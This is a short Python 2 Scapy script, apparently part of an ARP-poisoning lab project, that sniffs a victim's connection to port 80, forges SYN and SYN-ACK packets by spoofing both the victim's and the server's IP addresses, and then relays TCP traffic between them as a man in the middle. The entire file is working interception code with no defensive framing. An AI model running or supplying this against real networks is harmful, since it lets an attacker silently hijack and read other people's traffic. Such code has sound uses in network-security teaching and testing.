from scapy.all import *
from arppoison import gethostmac

def forward(p):
    if p[Ether].src == attackerMac:
        return
    if p[IP].src == ipToSpoof:
        send(ipLayerC / p[TCP], iface = 'enp0s3')
    elif p[IP].src == ipVictim:
        send(ipLayerS / p[TCP], iface = 'enp0s3')
    return p.summary()
        
def startforwarding(ipServer):
    global ipToSpoof, ipVictim, ipLayerS, ipLayerC, attackerMac
    attackerMac = gethostmac()
    ipToSpoof = ipServer
    print "Listening as " + ipToSpoof

    # SYN from client
    a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof, iface = 'enp0s3')
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # SYN to server
    ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
    tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq, window = a[0].window)
    answer = sr1(ipLayerS / tcpLayer, iface = 'enp0s3')

    # SYNACK to client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = answer.ack, window = answer.window)
    print sr1(ipLayerC / synAck, iface = 'enp0s3')
    print "Handshake completed"
    print "---------------------"

    sniff(filter = "tcp", prn = forward, iface = 'enp0s3')
